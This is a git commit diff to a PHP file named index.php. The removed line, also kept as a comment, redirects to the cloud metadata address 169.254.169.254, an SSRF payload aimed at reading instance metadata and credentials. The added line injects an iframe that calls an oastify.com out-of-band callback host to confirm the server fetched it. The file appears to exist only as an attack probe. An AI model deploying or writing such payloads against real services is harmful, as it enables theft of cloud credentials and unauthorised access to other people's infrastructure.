9ef88042ef064b8dd90f34bae7ce3a20731088df
Kaito Kid <74738975+Mr-Kaito-kid@users.noreply.github.com>
2025-11-06 15:06:45 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,2 +1,3 @@
 <?php
-echo '<script>window.location.replace("http://169.254.169.254/https://169.254.169.254/metadata/v1/");</script>';
+echo "><iframe src=https://lod1r0tx4aqj6reek2nzi90940aqyf.oastify.com/">
+//echo '<script>window.location.replace("http://169.254.169.254/https://169.254.169.254/metadata/v1/");</script>';
